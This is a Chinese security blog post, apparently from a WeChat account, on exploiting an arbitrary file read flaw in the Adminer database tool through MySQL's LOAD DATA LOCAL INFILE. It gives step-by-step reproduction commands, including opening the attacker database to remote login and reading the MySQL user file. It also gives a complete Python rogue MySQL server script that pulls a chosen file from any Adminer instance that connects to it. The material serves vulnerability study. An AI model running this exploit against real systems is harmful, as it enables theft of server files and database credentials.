\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s?\_\_biz=Mzg4NTUwMzM1Ng==&mid=2247483846&idx=1&sn=4abf0febab1675f2db99adcface3b4e9&chksm=cfa6a5d5f8d12cc32400fff9204c88226e993f8d5b6b654346d7786ad2400107db22b599b52c&scene=178&cur\_album\_id=1558250808859803651#rd)
| 

**声明：**该公众号大部分文章来自作者日常学习笔记，也有少部分文章是经过原作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。

请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。

 |

  

**0x01 前言**  

Adminer是一款轻量级的Web端数据库管理工具，支持MSSQL、MSSQL、Oracle、SQLite、PostgreSQL等众多主流数据库，类似于phpMyAdmin的MySQL管理客户端，整个程序只有一个PHP文件，易于使用安装，支持连接远程数据库，https://github.com/vrana/adminer 。

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeaYICV1Ced4WMA4mmKUnkHagLhsiab0VNXPSqCTW93goHQZrhlGJ7Wvuys0zR8v3P5KhPy8EjvEqQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x02 漏洞原理**

Adminer任意文件读取漏洞其实来源于MySQL“LOAD DATA INFILE”安全问题，原理可参考先知社区@mntn写的“通过MySQL LOAD DATA特性来达到任意文件读取”，Adminer4.6.3版本中已经修复了LOAD DATA LOCAL INFILE问题。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

****0x03 漏洞复现****

将我们攻击机的MySQL开启外链，然后执行EXP去读取一个不存在的文件让其报错得到绝对路径，最后再去读取数据库配置等指定文件即可，这里我随便读取的一个文件用于测试。

```
`grant all privileges on *.* to 'root'@'%' identified by 'root' with grant option;``grant all privileges on *.* to 'root'@'%';    //MySQL8开启外链`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

Adminer连接攻击机MySQL数据库时的用户名、密码及数据库名可以随意输入，只要服务器IP对即可。

```
root@kali:/tmp# python mysql_client.py "D:\phpStudy\PHPTutorial\WWW\av\1.php"
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

也可以在我们攻击机的MySQL创建一个新的数据库和表，然后在Adminer填入攻击机的MySQL服务器IP、用户名、密码和刚创建的数据库名。

```
`create database adminer;                //创建adminer数据库``use adminer;                            //进入adminer数据库``create table test(text text(4096));     //创建test数据表`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

执行以下SQL语句即可读取指定文件并将读取到的文件内容写入到刚创建的数据表里，不过得注意一下目标机的secure\_file\_priv选项，当它的值为null时就会读取不了文件了。

```
load data local infile "D:\\phpStudy\\PHPTutorial\\MySQL\\data\\mysql\\user.MYD" into table test FIELDS TERMINATED BY '\n';
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
`select * from test;        //查看test表内容``truncate table test;       //清空test表内容``drop database adminer;     //删除adminer数据库`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**0x04 利用程序**

```
`#coding=utf-8` `import socket``import logging``import sys``logging.basicConfig(level=logging.DEBUG)``filename=sys.argv[1]``sv=socket.socket()``sv.setsockopt(1,2,1)``sv.bind(("",3306))``sv.listen(5)``conn,address=sv.accept()``logging.info('Conn from: %r', address)``conn.sendall("\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00")``conn.recv(9999)``logging.info("auth okay")``conn.sendall("\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00")``conn.recv(9999)``logging.info("want file...")``wantfile=chr(len(filename)+1)+"\x00\x00\x01\xFB"+filename``conn.sendall(wantfile)``content=conn.recv(9999)``logging.info(content)``conn.close()`
```

  

****0x05** **参考链接****

*   https://xz.aliyun.com/t/3973
    
*   https://dev.mysql.com/doc/refman/8.0/en/load-data-local-security.html
    

* * *

  

**【推荐书籍】**

* * *

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  
![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  如果对你有所帮助，点个分享、赞、在看呗！![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)